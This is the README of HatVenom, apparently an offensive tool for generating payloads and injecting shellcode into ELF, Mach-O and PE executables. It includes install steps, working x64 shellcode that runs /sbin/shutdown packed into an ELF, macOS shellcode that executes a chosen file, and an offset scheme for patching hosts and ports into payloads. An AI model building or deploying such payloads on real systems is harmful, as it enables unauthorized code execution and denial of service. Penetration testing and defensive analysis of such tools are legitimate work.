# HatVenom

Powerful payload generation and shellcode injection tool that provides support for common platforms and architectures.

## Features

* Support for most common executable formats like `elf`, `macho`, `pe`.
* Support for most common architectures like `x64`, `x86`, `aarch64`, `armle`, `mipsle`, `mipsbe`.
* Ability to modify shellcode by changing pre-defined offsets.

## Installation

```bash
git clone https://github.com/EntySec/HatVenom.git
cd HatVenom
sudo python3 setup.py install
```

## Generating payload

It's very easy to generate payload for various targets in HatVenom. Let's generate simple payload that calls shutdown for Linux and save it to `a.out`.

### Examples

```
from hatvenom import HatVenom

shellcode = (
    b"\x48\x31\xc0\x48\x31\xd2\x50\x6a"
    b"\x77\x66\x68\x6e\x6f\x48\x89\xe3"
    b"\x50\x66\x68\x2d\x68\x48\x89\xe1"
    b"\x50\x49\xb8\x2f\x73\x62\x69\x6e"
    b"\x2f\x2f\x2f\x49\xba\x73\x68\x75"
    b"\x74\x64\x6f\x77\x6e\x41\x52\x41"
    b"\x50\x48\x89\xe7\x52\x53\x51\x57"
    b"\x48\x89\xe6\x48\x83\xc0\x3b\x0f"
    b"\x05"
)

hatvenom = HatVenom()
hatvenom.generate_to('elf', 'x64', shellcode)
```

## Generating payload with offsets

Payload offsets is a variables used to add something to shelcode on the preprocessing stage. Offsets looks like this:

```
\x90\x90\x90\x90:message:string:\x90\x90\x90\x90
```

Where `message` is an offset name and `string` is an offset type. So the basic usage of the offset looks like:

```
[shellcode]:[name]:[type]:[shellcode]
```

There are some possible offsets types:

* `string` - Plain text that will be converted to bytes on the preprocessing stage.
* `host` - IP address that will be converted to bytes on the preprocessing stage.
* `port` - Numeric port that will be converted to bytes on the preprocessing stage.

So if you want to replace offset with bytes instead of `string`, `host` and `port`, you can use this type:

```
[shellcode]:[name]:[shellcode]
```

### Examples

Let's generate simple payload that executes provided through `file` offset file for macOS and save it to `a.out`.

```python
from hatvenom import HatVenom

shellcode = (
    b"\x48\x31\xf6\x56\x48\xbf"
    b":file:string:"
    b"\x57\x48\x89\xe7\x48\x31"
    b"\xd2\x48\x31\xc0\xb0\x02"
    b"\x48\xc1\xc8\x28\xb0\x3b"
    b"\x0f\x05"
)

hatvenom = HatVenom()
hatvenom.generate_to('macho', 'x64', shellcode, {'file':'//usr/bin/whoami'})
```
